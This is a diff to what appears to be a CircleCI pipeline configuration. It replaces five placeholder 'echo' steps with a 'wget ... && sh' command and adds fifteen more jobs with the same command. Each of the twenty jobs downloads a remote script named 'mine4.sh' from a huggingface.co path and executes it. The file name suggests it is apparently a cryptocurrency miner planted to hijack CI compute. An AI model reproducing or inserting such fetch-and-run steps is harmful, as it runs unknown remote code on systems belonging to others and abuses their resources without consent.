@@ -4,28 +4,103 @@
           docker:
                 - image: ubuntu:latest
           steps:
-            - echo 1
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
         two:
           docker:
                 - image: ubuntu:latest
           steps:
-            - echo 2
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
         three:
           docker:
                 - image: ubuntu:latest
           steps:
-            - echo 3
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
         four:
           docker:
                 - image: ubuntu:latest
           steps:
-            - echo 4
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
         five:
           docker:
                 - image: ubuntu:latest
           steps:
-            - echo 5
-    
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        six:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        seven:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        8:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        9:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        10:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+
+        11:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        12:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        13:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        14:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        15:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        16:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        17:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        18:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        19:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
+        20:
+          docker:
+                - image: ubuntu:latest
+          steps:
+            - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
     workflows:
         version: 2
         build:
